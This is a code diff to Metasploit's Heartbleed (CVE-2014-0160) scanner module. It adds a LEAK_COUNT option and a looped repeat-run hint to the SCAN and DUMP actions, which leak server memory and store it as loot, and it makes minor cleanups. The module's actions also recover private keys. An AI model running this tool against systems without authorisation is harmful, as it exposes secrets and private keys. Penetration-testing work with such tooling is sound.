@@ -109,7 +109,14 @@ class MetasploitModule < Msf::Auxiliary
         STARTTLS may also be vulnerable.
 
         The module supports several actions, allowing for scanning, dumping of
-        memory contents, and private key recovery.
+        memory contents to loot, and private key recovery.
+
+        The LEAK_COUNT option can be used to specify leaks per SCAN or DUMP.
+
+        The repeat command can be used to make running the SCAN or DUMP many
+        times more powerful. As in:
+            repeat -t 60 run; sleep 2
+        To run every two seconds for one minute.
       },
       'Author'         => [
         'Neel Mehta', # Vulnerability discovery
@@ -129,7 +136,6 @@ class MetasploitModule < Msf::Auxiliary
       ],
       'References'     =>
         [
-          [ 'AKA', 'Heartbleed' ],
           [ 'CVE', '2014-0160' ],
           [ 'US-CERT-VU', '720951' ],
           [ 'URL', 'https://www.us-cert.gov/ncas/alerts/TA14-098A' ],
@@ -138,15 +144,19 @@ class MetasploitModule < Msf::Auxiliary
           [ 'URL', 'https://gist.github.com/takeshixx/10107280' ],
           [ 'URL', 'http://filippo.io/Heartbleed/' ]
         ],
-      'DisclosureDate' => 'Apr 7 2014',
+      'DisclosureDate' => '2014-04-07',
       'License'        => MSF_LICENSE,
       'Actions'        =>
         [
           ['SCAN',  {'Description' => 'Check hosts for vulnerability'}],
-          ['DUMP',  {'Description' => 'Dump memory contents'}],
+          ['DUMP',  {'Description' => 'Dump memory contents to loot'}],
           ['KEYS',  {'Description' => 'Recover private keys from memory'}]
         ],
-      'DefaultAction' => 'SCAN'
+      'DefaultAction' => 'SCAN',
+      'Notes' =>
+          {
+              'AKA' => ['Heartbleed']
+          }
     )
 
     register_options(
@@ -155,9 +165,10 @@ class MetasploitModule < Msf::Auxiliary
         OptEnum.new('TLS_CALLBACK', [true, 'Protocol to use, "None" to use raw TLS sockets', 'None', [ 'None', 'SMTP', 'IMAP', 'JABBER', 'POP3', 'FTP', 'POSTGRES' ]]),
         OptEnum.new('TLS_VERSION', [true, 'TLS/SSL version to use', '1.0', ['SSLv3','1.0', '1.1', '1.2']]),
         OptInt.new('MAX_KEYTRIES', [true, 'Max tries to dump key', 50]),
-        OptInt.new('STATUS_EVERY', [true, 'How many retries until status', 5]),
+        OptInt.new('STATUS_EVERY', [true, 'How many retries until key dump status', 5]),
         OptRegexp.new('DUMPFILTER', [false, 'Pattern to filter leaked memory before storing', nil]),
-        OptInt.new('RESPONSE_TIMEOUT', [true, 'Number of seconds to wait for a server response', 10])
+        OptInt.new('RESPONSE_TIMEOUT', [true, 'Number of seconds to wait for a server response', 10]),
+        OptInt.new('LEAK_COUNT', [true, 'Number of times to leak memory per SCAN or DUMP invocation', 1])
       ])
 
     register_advanced_options(
@@ -201,10 +212,17 @@ class MetasploitModule < Msf::Auxiliary
   # Main method
   def run_host(ip)
     case action.name
-      when 'SCAN'
-        loot_and_report(bleed)
-      when 'DUMP'
-        loot_and_report(bleed)  # Scan & Dump are similar, scan() records results
+      # SCAN and DUMP are similar, but DUMP stores loot
+      when 'SCAN', 'DUMP'
+        # 'Tis but a scratch
+        bleeded = ''
+
+        1.upto(leak_count) do |count|
+          vprint_status("Leaking heartbeat response ##{count}")
+          bleeded << bleed.to_s
+        end
+
+        loot_and_report(bleeded)
       when 'KEYS'
         get_keys
       else
@@ -258,6 +276,10 @@ class MetasploitModule < Msf::Auxiliary
 
   def tls_callback
     datastore['TLS_CALLBACK']
+  end
+
+  def leak_count
+    datastore['LEAK_COUNT']
   end
 
   #
@@ -487,13 +509,12 @@ class MetasploitModule < Msf::Auxiliary
 
   # Stores received data
   def loot_and_report(heartbeat_data)
-
-    unless heartbeat_data
+    if heartbeat_data.to_s.empty?
       vprint_error("Looks like there isn't leaked information...")
       return
     end
 
-    print_good("Heartbeat response with leak")
+    print_good("Heartbeat response with leak, #{heartbeat_data.length} bytes")
     report_vuln({
       :host => rhost,
       :port => rport,
@@ -535,7 +556,6 @@ class MetasploitModule < Msf::Auxiliary
 
     # Show abbreviated data
     vprint_status("Printable info leaked:\n#{abbreviated_data}")
-
   end
 
   #
@@ -695,7 +715,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     len = hdr.unpack('Cnn')[2]
-    data = get_data(len)
+    data = get_data(len) unless len.nil?
 
     unless data
       vprint_error("No SSL record contents received after #{response_timeout} seconds...")
